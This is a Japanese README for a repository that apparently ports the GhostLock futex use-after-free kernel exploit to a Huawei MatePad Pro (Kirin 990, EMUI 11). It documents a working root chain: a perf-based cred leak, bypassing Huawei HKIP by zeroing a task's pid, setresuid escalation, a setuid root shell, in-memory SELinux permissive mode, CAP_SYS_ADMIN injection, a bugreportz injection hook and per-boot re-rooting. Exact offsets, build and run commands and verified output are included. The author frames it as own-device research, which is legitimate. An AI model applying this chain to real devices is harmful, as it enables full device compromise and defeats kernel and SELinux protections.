# GhostLock on MRX-W09 — Huawei MatePad Pro (Kirin 990 / EMUI 11 / Linux 4.14.116) 向け root chain

**CVE-2026-43499（"GhostLock"）** の特定端末への移植と **エンドゲーム（root 取得）** の実機検証記録です。

> **状態: root 取得成功・実機検証済み／complete root 達成／ネイティブ GMS 稼働。**
> `rsh -c id` / `su -c id` → `uid=0(root) gid=0(root) … context=u:r:shell:s0`、
> root 所有の `/data/local/tmp/rooted.txt` と 4755 root 所有の `/data/local/tmp/rsh` を生成。
> **complete root**: SELinux `shell` 型を in-memory で permissive 化（常駐 stamp window 経由）＋
> **CAP_SYS_ADMIN** を注入し、**`mount(2)` で非 nosuid な tmpfs**（全プロセスから可視）を作成、
> そこに **4755 root 所有シェル**を設置（uid-2000 のプロセスが exec すると `euid=0`）。
> **ネイティブ GMS**: 本物の Google APK（MindTheGapps、`CN=Android, O=Google Inc.` 署名）を
> **`/system/priv-app` に privileged system app として配置**（overlayfs ＋ `system_server` 再走査）し、
> **本物の Play Store が動作**（アプリの実インストールと自己更新を実機で確認）。
> 対象は **Huawei MRX-W09**（MatePad Pro 10.8, 2019）／**EMUI 11（Android 10 ベース）**／
> **Linux 4.14.116（Kirin 990, arm64, LTO/CFI, Huawei HKIP 有効）**。

English version: [README.en.md](README.en.md)

---

## TL;DR

```text
$ /data/local/tmp/rsh -c id
uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0

$ ls -ln /data/local/tmp/
-rw-r--r-- 1 0 2000      67 rooted.txt
-rwsr-xr-x 1 0 2000 4094384 rsh
```

本リポジトリの価値は**メモリ破壊バグ本体ではありません**（CVE-2026-43499 は公開済みで PoC も複数存在）。
価値は**この端末固有のエンドゲーム**です:

1. この LTO/CFI カーネルで**実際に動く perf ベースの cred リーク**、
2. write primitive の**格納先セマンティクスを逆アセンブルで証明**、
3. **Huawei HKIP をカーネルソースから解明**し、**1行の条件（`task_pid_nr(task) == 0`）で無効化**。

---

## 1. 対象

| | |
|---|---|
| 端末 | Huawei **MRX-W09**（MatePad Pro 10.8", 2019） |
| SoC | HiSilicon **Kirin 990**（arm64） |
| カーネル | **Linux 4.14.116**、LTO/CFI、KASLR |
| OS | **EMUI 11**（Android 10） |
| SELinux | Enforcing（`shell` に capability allow 無し） |
| 追加防衛 | **HKIP**（Huawei Kernel Integrity Protection）/ HHEE / HISEe |

ブートローダは**ロック済み**で Kirin 990 の公開 unlock は存在しません（§8）。よってこの端末では
**カーネルエクスプロイトが唯一の root 経路**です。

---

## 2. 脆弱性（CVE-2026-43499 "GhostLock"）

futex PI 経路（`rt_mutex_adjust_prio_chain`）の use-after-free。`FUTEX_CMP_REQUEUE_PI` /
`pselect6` / IPv4 `MCAST_BLOCK_SOURCE` 経由でカーネルスタック上の stale `rt_mutex_waiter` を
`copy_from_user` で整形（"stamp"）し、`rb_erase_cached()` に消させる。この消去が我々の制御する
ストアを行う:

```
str x9,  [x8, #8]      ; *((p0 & ~3) + 8) = p1      (leaf: p1==0 のとき 8バイトの 0)
str x10, [x9]          ; *(p1) = p0                 (p1 != 0 のときのみ)
```

したがって write primitive は:

| 形状 | 呼び方 | 効果 |
|---|---|---|
| **leaf** | `wi(addr - 8, 0, 0)` | `*(addr) = 0`（8バイト） |
| **pointer** | `wi(value, target, 0\|1)` | `*(target) = value` |

leaf の格納先は**端末自身の `vmlinux.elf` の `rb_erase_cached.cfi` 逆アセンブルで証明**しています
（`docs/static-analysis/TASK_WRITE_SHAPE_20260926.md`）。よく引用される
`rb_erase_cached.cfi+0x88` は `p[2] != 0` 側の分岐で、本ペイロードでは**到達しません**。

---

## 3. エンドゲームの流れ

```
        ┌── (host) enabler を /system/bin/bugreportz に注入して実行
        │         -> perf_event_paranoid = -1
        ▼
  MAIN ── fork ──> CHILD
                     │
                     │ 1. 自分の cred C と task_struct X を perf でリーク
                     │      (SyS_setpriority.cfi をサンプルし x25 = current->cred を読む)
                     │
   MAIN ─────────────┤ 2. leaf-zero  X + 0x820        <- HKIP pid-0 シールド
                     │ 3. leaf-zero  C + 0x04        <- uid+gid = 0
                     │
                     │ 4. setresuid(0,0,0) -> 非 capability フォールバックが成立
                     │      -> commit_creds() -> uid 0 / fsuid 0
                     │
                     │ 5. uid 0 + shell ドメインで proof を書き、root コマンドを提供
                     ▼
             /data/local/tmp/rooted.txt   (uid 0 が作成)
             /data/local/tmp/rsh          (4755, root 所有)
             rsh -c id                    -> uid=0(root)
```

### 3.1 cred リーク — `SyS_setpriority.cfi` 内の `x25`

`SyS_setpriority` は `current->cred` を1回だけ実体化し、callee-saved レジスタに保持します:

```asm
ffffff800818e354 <SyS_setpriority.cfi>:
+0x34  mrs  x19, sp_el0            ; x19 = current
+0x38  ldr  w8,  [x19,#1728]
+0x3c  ldr  x25, [x19,#2536]       ; x25 = current->cred   (2536 = 0x9E8)
+0x1f8  adrp x25, …                ; ここで x25 再利用
```

よって `ip ∈ [SyS_setpriority.cfi+0x3c, +0x1f8)`（0x1BC バイト）のサンプルは
`regs[25] == current->cred`。300,000 回の `setpriority(0,0,-20)` ストームを回し、窓内の
最後の `x25` を返します（perf のレジスタ順はカーネルツリーで確認: index 25 = `PERF_REG_ARM64_X25`）。

以前の試みが失敗した理由: `security_capable.cfi` の `x0` は**入口命令のみ** cred、
`cap_capable` は `x20` 保持、全レジスタ投票は `current` が支配する。

### 3.2 HKIP の無効化（決定的な発見）

Huawei HKIP は pid ごとの「root 許可ビット」を持ち、ビット未設定で root 状のタスクを**殺します**。
端末カーネルソース（`drivers/hisi/hhee/hkip/critdata.c`, `include/linux/hisi/hisi_hkip.h`）より:

```c
static bool hkip_compute_uid_root(const struct cred *c)
{
    return uid_eq(c->uid,0) || uid_eq(c->euid,0) || uid_eq(c->suid,0) ||
           !cap_isclear(c->cap_inheritable) || !cap_isclear(c->cap_permitted);
}
int hkip_check_uid_root(void)
{
    if (hkip_get_current_bit(hkip_uid_root_bits, /* def_value = */ true))
        return 0;                       /* <-- 免除 */
    if (unlikely(hkip_compute_uid_root(creds) || uid_eq(creds->fsuid, 0))) {
        pr_alert("UID root escalation!\n");
        force_sig(SIGKILL, current);    /* <-- 殺し屋 */
        return -EPERM;
    }
    return 0;
}
static inline bool hkip_get_task_bit(const u8 *bits, struct task_struct *t, bool def_value)
{
    pid_t pid = task_pid_nr(t);
    if (pid != 0) return hkip_get_bit(bits, pid, PID_MAX_DEFAULT);
    return def_value;                   /* <-- pid 0 は免除 */
}
```

* チェックは `__cap_capable` / `prepare_creds` / `copy_process` / `acl_permission_check` から呼ばれる。
* ビットは `commit_creds`（`hkip_update_xid_root`）と `fork`（`hkip_init_task`）だけが設定できる
  （ビットマップは HVC 保護領域）。
* **`task_pid_nr(task) == 0` ⇒ `def_value == true` ⇒ そのタスクの HKIP チェックは常に 0。**

⇒ root 化の**前に** `task_struct.pid`（オフセット `0x820`）をゼロにすれば、**1タスクが完全に
HKIP 免除**になります（"pid-0 シールド"）。pid-0 のタスクは **exit 禁止**
（`kernel/exit.c:786` が *"Attempted to kill the idle task!"* で panic）なので永久に待機させます。
そこからの `fork()` は合法で、子は実 pid と root cred から算出された HKIP ビットを得ます。

### 3.3 非 capability フォールバックによる root

このポリシーでは `shell` に capability がありません（`adbd` には有るが `shell` には無い）。
よって `ns_capable(CAP_SETUID)` 経路は全滅。唯一の道は `setresuid(0,0,0)` の
**非 capability フォールバック**:

```c
if (!ns_capable(old->user_ns, CAP_SETUID)) {
    if (ruid != -1 && !uid_eq(kruid, old->uid) && !uid_eq(kruid, old->euid) &&
                      !uid_eq(kruid, old->suid)) goto error;
    …
}
```

したがって `old->uid == 0` にすれば十分（leaf store で `cred+0x04`）。`commit_creds()` が
`uid 0` と `fsuid = euid = 0`（＝生成ファイルが root 所有）を与え、HKIP はシールドにより通ります。

### 3.4 `nosuid` な `/data` 上での root シェル

`/data` は `nosuid` マウントのため、そこに置いた 4755 バイナリでは root になれません。
代わりに**シールドされた uid-0 タスクが abstract unix socket（`\0gl_su`）で root コマンドを提供**し、
`rsh` は同じバイナリのクライアントモードで `-c CMD` を転送します。リクエストごとに fork した
孫は `copy_process → hkip_init_task()` が root cred からビットを書くため**合法な root**です。

---

## 4. 構成

```
exploit/ghostlock_mrx_e.c   エクスプロイト本体（単一ファイル。診断モード多数、endgame は --simple）
exploit/offset_mrx.h        このビルド用の構造体/シンボルオフセット
enabler/inject_hook.c       host 側 enabler（/system/bin/bugreportz へ注入）
docs/FACTS.md               端末ごとの研究ログ（facts 9an(1)…(133)）
docs/HKIP_DECODED_20260922.md
docs/SYMBOLS_20260926.md    端末自身の vmlinux.elf から取得した ground-truth シンボル
docs/static-analysis/       逆アセンブル/ポリシー解析レポート5本
docs/PUBLICATION_REVIEW_ja.md  公開可否のための裏取り（法令・ポリシー・開示状況）
```

---

## 5. ビルド

```sh
aarch64-linux-android24-clang -O2 -static -pthread -o ghostlock_e ghostlock_mrx_e.c
```

（本検証は NDK r20b を使用）

## 6. 実行

```sh
adb push ghostlock_e /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock_e

# 1) enabler を設置・注入し、トリガする
adb shell /data/local/tmp/inject_hook place 0x84000 0x244 0x7a3d8
adb shell /data/local/tmp/inject_hook hook  0x7a3d4 0x84000
adb shell nohup /system/bin/bugreportz >/dev/null 2>&1 &
adb shell /data/local/tmp/inject_hook restore 0x7a3d4 0xd10403ff
adb shell cat /proc/sys/kernel/perf_event_paranoid      # -1 になること

# 2) エンドゲームを実行
adb shell nohup /data/local/tmp/ghostlock_e --simple >/dev/null 2>&1 &

# 3) 検証
adb shell ls -ln /data/local/tmp/rooted.txt /data/local/tmp/rsh
adb shell /data/local/tmp/rsh -c id
```

---

## 7. 実機での検証結果

```
=== /data/local/tmp/rooted.txt ===
=== GHOSTLOCK MRX-W09 rooted ===
uid=0 euid=0 context=u:r:shell:s0

$ /data/local/tmp/rsh -c id
uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0

$ ps -A -o PID,UID,NAME | grep ghostlock
 4441     0 ghostlock_e        # シールドされた uid-0 タスク
 4212  2000 ghostlock_e        # 起動側
```

## 8. この root が **できない** こと

* bounding set は `0xc0`、`setresuid` 後の cred は **capability ゼロ**、ドメインは
  `u:r:shell:s0` のまま。**「shell ドメイン内での DAC root」**であり、`mount`・`insmod`・
  `/dev/block`・`/system` 書き込みは**できません**。
* **1ブート限り**（毎回起動時に再実行）。ブートローダは**ロック済み**で Kirin 990 の公開 unlock は
  存在しません（PotatoNV は Kirin 960 まで、BootROM の CVE は USB Download Mode を殺す eFuse で
  対策済み、テストポイント＋基板ソフト法は Kirin 990 **5G** 限定かつ MatePad Pro 2019 の基板ソフトは
  非公開）。カーネルエクスプロイトからブートローダへは到達できません（検証鍵と unlock 状態は
  ROM/eFuse/TEE に存在）。
* さらなる特権化（full caps + `mount`）は進行中: `--cede`（pid-0 シールド下で
  `task->cred = &init_cred`）で `CAP_FULL_SET` とカーネル SELinux ドメインは得られますが、
  カーネルドメインはユーザのファイル I/O を拒否するため、**改変ポリシーを cede 済みタスクから
  ロードする**計画です（`docs/FACTS.md` 9an(133) 以降）。

## 9. 謝辞

* GhostLock 本体と PoC 群の原著者（`ghostlock_pocs/` に列挙）。
* 「cred を実体化する関数のレジスタをサンプルする」着想: **aquos-r6** PoC 系。
* `docs/` の内容はすべて**この端末自身の `vmlinux.elf` とカーネルツリー**から導出しています。
* HKIP のコード引用は GPLv2 カーネルソース由来（[NOTICE](NOTICE) 参照）。

## 10. 免責

著者が**所有する端末**でのセキュリティ研究・相互運用・修理を目的としたものです。
CVE-2026-43499 は公開済みで PoC も既に複数存在します。**他人が所有する端末に対して使用しないで
ください。** 無保証・現状のまま提供します。法的立場および免責事項（正式な法的通知）は
[docs/PUBLICATION_REVIEW_ja.md](docs/PUBLICATION_REVIEW_ja.md) を参照。

## 11. 永続化

この端末では**完全自動の再rootは存在しません**（静的調査: 起動時に書き込み可能領域から exec する
アクターが無い／`shell_data_file` を exec できるのは `shell` ドメインだけ／setuid は `/data` が
`nosuid` のため無効）。`/data` は永続するので、**再起動後は 1 コマンドで復活**できます:

```sh
adb shell /data/local/tmp/reroot.sh
```

詳細は [docs/static-analysis/TASK_PERSISTENCE_20260926.md](docs/static-analysis/TASK_PERSISTENCE_20260926.md)
と [tools/reroot.sh](tools/reroot.sh) を参照。
## 12. 追加特権化の進捗（complete root）

この root は **uid 0 + capabilities 0 + `u:r:shell:s0`** です。そこから **complete root**
（任意 capability・`mount`・`/dev/block` 等）へ拡張する研究を継続しており、主要素は**実機で個別に検証済み**です:

| 要素 | 状態 |
|---|---|
| uid 0 + shell ドメイン + root サーバ（`rsh`/`su`） | ✅ 検証済み |
| **CAP_SYS_ADMIN 注入**（アドレス選択方式・read-back で証明） | ✅ 検証済み |
| **SELinux `shell` 型の permissive 化**（resident stamp window 経由、`--freeze`） | ✅ 検証済み（`mount` の errno が EACCES→EPERM に変化＝SELinux 拒否が消えた） |
| 統合（`mount(2)` → 非nosuid → 4755 root シェル） | 🔧 進行中 |

重要な技術的制約: 与えられた write primitive は「**カーネルポインタ**または**リテラル0**」しか書けず、
**小さい整数値**（`ebitmap_node.startbit` など）は書けません。したがって任意バイトを置ける
**resident stamp window**（`copy_from_user` 由来）が complete root の鍵になります。
詳細と実測記録は `docs/FACTS.md`（9an(1)〜(150)）と `docs/static-analysis/*_20260926.md` を参照。
### complete root（`--root`）の補足

`--root` は `--freeze`（SELinux permissive）＋ CAP_SYS_ADMIN 注入 ＋ `--simple`（uid 0 / pid-0 シールド）を
統合し、**その場で `mount(2)` を実行して非 nosuid な tmpfs を作り、4755 root 所有のシェルを置く**ところまで
実機検証済みです（`mount` rc=0、`/mnt` は `nosuid`/`noexec` なし、uid-2000 のプロセスが 4755 シェルを
exec すると euid=0）。

この mount は **全プロセスから見えます**（FACTS 152）。shell / adb / exploit は既に init の mount
namespace を共有しており（`readlink /proc/self/ns/mnt` == `/proc/1/ns/mnt` == `mnt:[4026533392]`、
mount id も一致）、別の `adb shell` も `system_server`（slave clone）も同じ mount を見ます。以前の
「namespace 内に限られる」という記述は、`/system/bin/sh` が `-p` なしで euid を落とす mksh の仕様
（`glsh -c id` は uid=2000、`glsh -p -c id` は euid=0）を誤診したものでした。`setns("/proc/1/ns/mnt")`
は不要です（Huawei の `mntns_install` は `CAP_SYS_CHROOT` も要求するため EPERM になる）。
`mount -t overlay` も実 `/system` lowerdir で動作確認済みで、GMS の `/system` overlay の前提が整いました。

## 13. 2026-09-26 追記：PC なし復元が実機で完成（+36 秒）と運用上の落とし穴

### 13.1 実測済みの復元手順（PC なし・1 トリガ）

`/data/local/tmp` に `shellcode.bin`（payload）/`glboot.sh`/`gms_setup.sh`/`ghostlock_e`/`gms_stage` がある状態で:

```sh
# 1) enabler を張る（Mali ページキャッシュ書き込み・RAM のみ）
inject_hook place 0x84000 <payload_size-4> 0x7a3d8     # payload 720 B なら 0x2cc
inject_hook hook  0x7a3d4 0x84000

# 2) 1 回だけトリガ（= 設定 → 開発者向けオプション → バグレポートを取得 と同じ経路）
nohup /system/bin/bugreportz &
```

**実測（コールドブートから）**: `+36 秒` で `perf_event_paranoid=-1`、overlay 3 本
（`/system/priv-app`, `/system/etc/permissions`, `/system/etc/sysconfig`）が付き、
`com.google.android.gms` / `com.google.android.gsf` / `com.android.vending` が **PRIVILEGED**。

1 回のトリガで **2 つのプロセス**が立ち、payload の 2 段ガードが両方を受けます:

| プロセス | uid | ドメイン | perf 書込 | `shell_data_file` exec |
|---|---|---|---|---|
| `bugreportz`（`com.android.shell` が起動） | 2000 | **u:r:shell:s0** | ✗ | **✓ 唯一** |
| `dumpstate`（init が起動） | 0 | u:r:dumpstate:s0 | ✓（CapEff=`0000007fffffffff`） | ✗ |

### 13.2 落とし穴（すべて実測・再発防止用）

1. **能力の無い uid-0 ドメインが stage1 を食う** — `u:r:installd:s0` は
   perf を書けず（EACCES）、CAP_DAC_OVERRIDE も無いのでマーカーを消せない。
   ⇒ payload は **「perf を先に書いて、書けた時だけ claim」** が必須。無いと
   `[-] KASLR leak failed`（`ghostlock_mrx_e.c:3365`）で数分浪費して失敗する。
2. **su サーバ（`\0gl_su`）では overlay を貼れない** — 子が
   `CapEff=0000000000000000` / `CapBnd=0x00000000000000c0` なので `mount(2)` は EPERM、
   `/data/local/tmp`（`shell:shell 0771`）への `mkdir` も EACCES。overlay を貼れるのは
   **exploit 自身の uid-0 子（`ghostlock_e --root-gms`）だけ**。
3. **`/dev` はマーカーに使えない** — `tmpfs 0755 root:root` のため uid-2000 は DAC で不可、
   dumpstate ドメインは SELinux で拒否。マーカーは `/data/local/tmp` に置くしかない。
4. **マーカーは再起動で消えない** — 両方残ったブートは payload が EEXIST で return し、
   誰も復元できない（アプリも installd も unlink 不可）。⇒ 成功時に掃除する、
   または uid-0 経路で古い `.glp2` を消す運用が必要（設計上の残課題）。
5. **同一ブートで exploit を 2 回走らせない** — 実測で**リセット**する（FACTS 9an(164)D）。
   `inject_hook restore` も同一ブートでは禁止（Mali 書き込みの 2 回目）。
6. **Play の自己更新が「破壊」の正体** — ログインすると GMS/Play が `/data/app` へ更新され、
   システム実体は毎ブートの overlay 側だけなので、次のコールドブートで
   **特権を失った `/data` コピーが特権コンポーネントを要求してクラッシュループ**
   （`INTERACT_ACROSS_USERS` / `MANAGE_USERS`）。⇒ 自動更新は OFF、または Aurora Store。
7. **アプリのインストールが端末に拒否されることがある** — Play Protect / Huawei の確認で
   `INSTALL_FAILED_ABORTED: User rejected permissions`。Play Protect のスキャンを切るか、
   `/sdcard` からタップしてインストールする。
8. **`su` シンボリックリンクの消失（実測・要注意）** — factory reset は `/data/local/tmp` を
   丸ごと消す。`ghostlock_e --root` が成功して abstract socket `\0gl_su` の root サーバが
   上がっていても、**クライアントの `/data/local/tmp/su`（= `ghostlock_e` への symlink）が無いと
   `su -c true` が失敗**し、restore が「root サーバ無し」と誤判定 → per-boot ロックを解放して
   再試行 → **exploit の多重同時実行**（load 急増、watchdog / pid-0 panic リスク）になる。
   対策は 2 つ: (a) 判定を**名前非依存**の `ghostlock_e --rshcli 'id -u'` == 0（fallback
   `su -c true`）にする、(b) `provision.sh` が `ln -sf ghostlock_e /data/local/tmp/su` を再作成する。
   （出典: `docs/session_20260926/ROOTSHELL_MEMO_20260926.md` §4、`evidence/CHANGE09_neutralize_marker.txt`）
9. **`/data/local/tmp/gms_stage` は「通常ファイル」でガード** — 危険だった旧 `.rc` payload は
   `lowerdir=/data/local/tmp/gms_stage/{permissions,sysconfig,priv-app}:...` を mount していた。
   `gms_stage` を**0 byte の通常ファイル**のままにしておくと `gms_stage/<x>` は **ENOTDIR** になり、
   旧 mount 行は決して成功しない。reset 耐性・再起動永続の belt+braces（現在の marker `.rc` は
   mount 行自体が無い）。（出典: `evidence/CHANGE09_neutralize_marker.txt`）

### 13.3 関連

- GMS 導入手引き（別リポジトリ）: https://github.com/0ch4/ghostlock-mrx-w09-gms
- 前面アプリ（1 タップ復元）の設計: `ghostlock_app/DESIGN.md`（実測 / 要確認を明記）
- 実測ログ: `binder_uaf/session_20260922/MRX_W09_GHOSTLOCK_FACTS.md`（9an(1)〜(168)）
---

## 14. 2026-09-26 更新（実機検証済み・作業セッションの反映）
- **shield-free が既定**: `--root` / `--root-gms` は pid-0 シールド無し（旧シールドは `--root-old` / `--root-gms-old`）。合法 uid0 は
  shell型permissive + `cap_effective`(CAP_SETUID) + `setresuid(0,0,1)` → `commit_creds` → `hkip_update_xid_root` が**実pidに HKIP bit** を設定（pid-0 の panic landmine を除去）。
- **overlay は all-or-nothing**: `/system/etc/permissions`・`/system/etc/sysconfig` を先、`/system/priv-app` を**最後**に mount。失敗時は `umount2` でロールバックし**framework 再起動しない**（不完全 overlay は GMS/Play をクラッシュループさせランチャーを黒画面にする）。AVC の stale deny 対策にリトライ付き。
- **root の tmpfs を `/dev`・`/mnt`・`/data/local/tmp` に被せない**（`/data/local/tmp/glrt*` の subdir のみ）。
- **実測**: cold boot → arm → 1トリガ → **約5秒で overlay 3/3** → +30〜60秒で **PRIVILEGED ×3**。**pid-0 タスクは存在しない**。
- **前面アプリ** `app/`: 「★復元(1操作)」＋AccessibilityService 自動タップ（バグレポートを取得→完全レポート→報告）で復元。
- 注意: overlay は 1ブート限り。常用は microG+Aurora+ReVanced 推奨。詳細・証拠: `docs/session_20260926/`（STATUS/CHANGE01-06）。

### 14.1 最新検証状態（2026-09-26 追記：CHANGE 08 の無害化まで）

- **注入 `/system/etc/init/perfetto.rc` は marker payload に無害化済み**（危険な `mount` 3 行を削除し
  `setprop gl.boot.injected 1` のみ）。書き込み先は EROFS ブロック **`sdd71@139218`**
  （super phys `570236928` = `139218 × 4096`）、marker ブロックの sha256 =
  **`1be82ca9fba253332ac00e2ee61bbbea061028b440647f8c19f6d03f990238fe`**。
  **コールドブート後の実測**: `getprop gl.boot.injected == 1`、`mount` に `/system` overlay は**無し**、
  通常起動（uptime OK / `perf_event_paranoid=3`）、`cat /system/etc/init/perfetto.rc` が marker 内容。
  （出典: `evidence/CHANGE09_neutralize_marker.txt`、`docs/session_20260926/PERSISTENCE_SAFETY_ARCHITECTURE_20260926.md` §5）
- **恒久化の現状（正直に）**: EROFS への単一ブロック改変は **FEC が黙って元ブロックへ訂正**するため
  原理的に効かない（`docs/session_20260926/FEC_ANALYSIS_20260926.md`）。boot バイナリ置換は
  SELinux（`mounton system_file` は init のみ／exec はドメイン遷移）で **DEAD**
  （`docs/session_20260926/PERSISTENCE_RAW_SUPER_20260926.md` §47-57、`BL_STATIC_ANALYSIS_20260926.md`）。
  ⇒ **native GMS は依然 per-boot overlay のみ**（`docs/session_20260926/POSTMORTEM_BRICK_20260926.md`）。
- **安全な boot-hook 設計の前提 SI-2 は実機成立**: `/data/gls` の `chcon u:object_r:system_file:s0` は
  再起動を越えて保持される（init は `/data` を一括 restorecon しない）。boot 時 mount 本体（P3）は**未検証**。
  （出典: `evidence/CHANGE10_label_persistence.txt`）
- 今回 `docs/session_20260926/` に追加: LATEST_CODE_SUMMARY / PERSISTENCE_SAFETY_ARCHITECTURE /
  POSTMORTEM_BRICK / FEC_ANALYSIS / PERSISTENCE_RAW_SUPER / ROOTSHELL_MEMO / BL_STATIC_ANALYSIS /
  CHANGE_01 / CHANGE_02 / CHANGE_08。`evidence/` に CHANGE01–10 を追加。
- GMS 側（別リポジトリ）: canonical は `scripts/gms_restore.sh`（v6/v7、sha256 `6B023043…`）。
  これに **`scripts/restore_root.sh`**（root-only 派生。`--root` に変更＋名前非依存の root 判定）と
  **`scripts/provision.sh`**（`/data/local/tmp/su` symlink を再作成）を追加。詳細は gms README §3/§8。
